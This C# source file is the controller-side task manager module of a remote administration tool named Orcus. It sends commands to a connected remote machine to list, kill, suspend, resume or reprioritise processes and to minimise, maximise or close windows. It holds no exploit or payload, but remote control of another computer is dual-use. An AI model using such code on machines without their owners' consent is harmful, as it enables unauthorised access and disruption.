using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Windows;
using Orcus.Administration.Commands.Extensions;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.TaskManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.TaskManager
{
    [DescribeCommandByEnum(typeof (TaskManagerCommunication))]
    public class TaskManagerCommand : Command
    {
        private List<AdvancedProcessInfo> _allProcesses;

        public List<AdvancedProcessInfo> Processes { get; private set; }
        public event EventHandler<List<AdvancedProcessInfo>> RefreshList;

        public override void ResponseReceived(byte[] parameter)
        {
            Serializer serializer;
            switch ((TaskManagerCommunication) parameter[0])
            {
                case TaskManagerCommunication.ResponseFullList:
                    Processes?.ToList().ForEach(x => x.Dispose());
                    serializer = new Serializer(typeof (List<AdvancedProcessInfo>));
                    _allProcesses =
                        new List<AdvancedProcessInfo>(
                            serializer.Deserialize<List<AdvancedProcessInfo>>(parameter, 1));
                    RecreateProcessList();
                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedProcesses"],
                        _allProcesses.Count, FormatBytesConverter.BytesToString(parameter.Length - 1)));
                    RefreshList?.Invoke(this, Processes);
                    break;
                case TaskManagerCommunication.ResponseChanges:
                    serializer = new Serializer(typeof (ProcessListChangelog));
                    var changelog = serializer.Deserialize<ProcessListChangelog>(parameter, 1);

                    foreach (
                        var process in
                            changelog.ClosedProcesses.Select(
                                closedProcess => _allProcesses.FirstOrDefault(x => x.Id == closedProcess))
                                .Where(process => process != null))
                    {
                        process.Dispose();
                        _allProcesses.Remove(process);
                    }
                    foreach (var processInfo in changelog.NewProcesses)
                        _allProcesses.Add(new AdvancedProcessInfo(processInfo));
                    RecreateProcessList();
                    LogService.Receive(string.Format((string) Application.Current.Resources["ReceivedChanges"],
                        changelog.ClosedProcesses.Count, changelog.NewProcesses.Count));
                    RefreshList?.Invoke(this, Processes);
                    break;
                case TaskManagerCommunication.ResponseTaskKillFailed:
                    LogService.Error(string.Format((string) Application.Current.Resources["TaskKillFailed"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case TaskManagerCommunication.ResponseTaskKilled:
                    LogService.Receive((string) Application.Current.Resources["TaskSuccessfulKilled"]);
                    break;
                case TaskManagerCommunication.ResponsePrioritySet:
                    LogService.Receive((string) Application.Current.Resources["PrioritySet"]);
                    break;
                case TaskManagerCommunication.ResponseSetPriorityFailed:
                    LogService.Error(string.Format((string) Application.Current.Resources["SetPriorityFailed"],
                        Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1)));
                    break;
                case TaskManagerCommunication.ResponseProcessTreeKilled:
                    LogService.Receive((string) Application.Current.Resources["ProcessTreeKilled"]);
                    break;
                case TaskManagerCommunication.ResponseProcessSuspended:
                    LogService.Receive((string) Application.Current.Resources["ProcessSuspended"]);
                    break;
                case TaskManagerCommunication.ResponseProcessResumed:
                    LogService.Receive((string) Application.Current.Resources["ProcessResumed"]);
                    break;
                case TaskManagerCommunication.ResponseWindowActionDone:
                    LogService.Receive((string) Application.Current.Resources["ChangeWindowStateSucceeded"]);
                    break;
                case TaskManagerCommunication.ResponseWindowActionFailed:
                    LogService.Error((string) Application.Current.Resources["ChangeWindowStateFailed"]);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private void RecreateProcessList()
        {
            var childProcesses = new List<AdvancedProcessInfo>();
            foreach (var advancedProcessInfo in _allProcesses)
            {
                var processChildProcesses = new List<AdvancedProcessInfo>();
                foreach (var processInfo in _allProcesses)
                {
                    if (processInfo.ParentProcess == advancedProcessInfo.Id && processInfo.ParentProcess != 0)
                    {
                        processChildProcesses.Add(processInfo);
                        childProcesses.Add(processInfo);
                    }
                }

                advancedProcessInfo.ChildProcesses = processChildProcesses;
            }

            Processes = _allProcesses.Where(x => x.Id == 0 || !childProcesses.Contains(x)).ToList();
        }

        public void Refresh()
        {
            LogService.Send(Processes == null
                ? (string) Application.Current.Resources["GetProcessList"]
                : (string) Application.Current.Resources["UpdateProcessList"]);
            ConnectionInfo.SendCommand(this,
                new[]
                {
                    Processes == null
                        ? (byte) TaskManagerCommunication.SendGetFullList
                        : (byte) TaskManagerCommunication.SendGetChanges
                });
        }

        public void KillProcess(AdvancedProcessInfo processInfo)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["KillProcess"], processInfo.Name,
                processInfo.Id));
            var package = new List<byte> {(byte) TaskManagerCommunication.SendKill};
            package.AddRange(BitConverter.GetBytes(processInfo.Id));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void SetProcessPriority(AdvancedProcessInfo processInfo, ProcessPriorityClass priority)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["SetProcessPriority"], processInfo.Name,
                processInfo.Id, priority));
            var package = new List<byte> {(byte) TaskManagerCommunication.SetPriority};
            package.AddRange(BitConverter.GetBytes(processInfo.Id));
            package.AddRange(BitConverter.GetBytes((int) priority));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void KillProcessTree(AdvancedProcessInfo processInfo)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["KillProcessTreeSent"],
                processInfo.Name,
                processInfo.Id));
            var package = new List<byte> {(byte) TaskManagerCommunication.KillProcessTree};
            package.AddRange(BitConverter.GetBytes(processInfo.Id));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void SuspendProcess(AdvancedProcessInfo processInfo)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["SuspendProcessSent"], processInfo.Name,
                processInfo.Id));
            var package = new List<byte> {(byte) TaskManagerCommunication.SuspendProcess};
            package.AddRange(BitConverter.GetBytes(processInfo.Id));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void ResumeProcess(AdvancedProcessInfo processInfo)
        {
            LogService.Send(string.Format((string) Application.Current.Resources["ResumeProcessSent"], processInfo.Name,
                processInfo.Id));
            var package = new List<byte> {(byte) TaskManagerCommunication.ResumeProcess};
            package.AddRange(BitConverter.GetBytes(processInfo.Id));
            ConnectionInfo.SendCommand(this, package.ToArray());
        }

        public void BringWindowToFront(AdvancedProcessInfo processInfo)
        {
            var package = new List<byte> {(byte) TaskManagerCommunication.WindowBringToFront};
            package.AddRange(BitConverter.GetBytes(processInfo.MainWindowHandle));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SendBringWindowToFront"],
                processInfo.MainWindowHandle));
        }

        public void RestoreWindow(AdvancedProcessInfo processInfo)
        {
            var package = new List<byte> {(byte) TaskManagerCommunication.WindowRestore};
            package.AddRange(BitConverter.GetBytes(processInfo.MainWindowHandle));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SendRestoreWindow"],
                processInfo.MainWindowHandle));
        }

        public void MinimizeWindow(AdvancedProcessInfo processInfo)
        {
            var package = new List<byte> {(byte) TaskManagerCommunication.WindowMinimize};
            package.AddRange(BitConverter.GetBytes(processInfo.MainWindowHandle));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SendMinimizeWindow"],
                processInfo.MainWindowHandle));
        }

        public void MaximizeWindow(AdvancedProcessInfo processInfo)
        {
            var package = new List<byte> {(byte) TaskManagerCommunication.WindowMaximize};
            package.AddRange(BitConverter.GetBytes(processInfo.MainWindowHandle));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SendMaximizeWindow"],
                processInfo.MainWindowHandle));
        }

        public void CloseWindow(AdvancedProcessInfo processInfo)
        {
            var package = new List<byte> {(byte) TaskManagerCommunication.WindowClose};
            package.AddRange(BitConverter.GetBytes(processInfo.MainWindowHandle));
            ConnectionInfo.SendCommand(this, package.ToArray());
            LogService.Send(string.Format((string) Application.Current.Resources["SendCloseWindow"],
                processInfo.MainWindowHandle));
        }

        public AdvancedProcessInfo GetParentProcessInfo(AdvancedProcessInfo processInfo)
        {
            if (processInfo.Id == 0)
                return null;

            return _allProcesses.FirstOrDefault(x => x.Id == processInfo.ParentProcess);
        }

        protected override uint GetId()
        {
            return 16;
        }
    }
}